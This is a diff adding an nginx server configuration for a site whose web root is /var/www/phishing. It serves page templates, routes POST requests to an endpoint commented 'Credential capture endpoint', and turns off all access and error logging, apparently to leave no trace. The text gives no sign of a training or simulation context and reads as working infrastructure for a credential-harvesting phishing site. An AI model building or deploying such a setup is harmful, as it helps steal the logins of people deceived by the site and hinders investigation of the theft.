@@ -1,0 +1,40 @@
+server {
+    listen 80;
+    server_name _;
+    
+    root /var/www/phishing;
+    index index.html index.php;
+    
+    # Disable all logging
+    access_log off;
+    error_log /dev/null crit;
+    
+    # PHP processing
+    location ~ \.php$ {
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
+        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+    }
+    
+    # Credential capture endpoint
+    location = /capture.php {
+        limit_except POST { deny all; }
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
+    }
+    
+    # Template routing
+    location /templates/ {
+        try_files $uri $uri/ =404;
+    }
+    
+    # Static resources
+    location /static/ {
+        try_files $uri $uri/ =404;
+    }
+    
+    # Default
+    location / {
+        try_files $uri $uri/ /index.html;
+    }
+}
